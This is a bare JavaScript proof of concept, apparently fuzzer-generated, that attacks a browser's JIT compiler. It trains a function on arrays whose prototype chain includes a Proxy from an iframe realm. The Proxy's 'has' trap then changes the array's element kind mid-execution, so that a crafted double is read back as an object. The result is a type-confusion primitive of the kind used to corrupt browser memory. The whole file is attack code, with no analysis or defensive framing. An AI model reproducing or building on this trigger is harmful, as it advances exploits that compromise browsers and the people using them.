function opt(a1, a2) {
    a1[1] = 1.1;
    let tmp = 0 in a2;
    a1[0] = 2.3023e-320;
    return tmp;
}
function main() {
    let v11;
    try { v11 = document.createElement("iframe"); } catch (e) {}
    const v12 = document?.body;
    let v13;
    try { v13 = v12.appendChild(v11); } catch (e) {}
    let o = v13?.contentWindow;
    const v16 = `\nlet p = new Proxy({}, {});\nlet a = {__proto__: {}};\na.__proto__.__proto__ = p;\n`;
    try { o.eval(v16); } catch (e) {}
    let arr = [1.1,2.2];
    let arr2 = [1.1,2.2];
    const v26 = o?.Object;
    let v27;
    try { v27 = new v26(); } catch (e) {}
    let proto = v27;
    let handler = {};
    arr2.__proto__ = proto;
    const v32 = {};
    const v36 = {
        has() {
            arr[0] = {};
            return true;
        },
    };
    let v37;
    try { v37 = new Proxy(v32, v36); } catch (e) {}
    proto.__proto__ = v37;
    for (let i39 = 0; i39 < 10000; i39++) {
        try { opt(arr, arr2); } catch (e) {}
    }
    const v46 = () => {
        delete arr2?.[0];
        try { opt(arr, arr2); } catch (e) {}
        const v50 = arr?.[0];
        try { console.log(v50); } catch (e) {}
    };
    try { setTimeout(v46, 500); } catch (e) {}
}
try { main(); } catch (e) {}
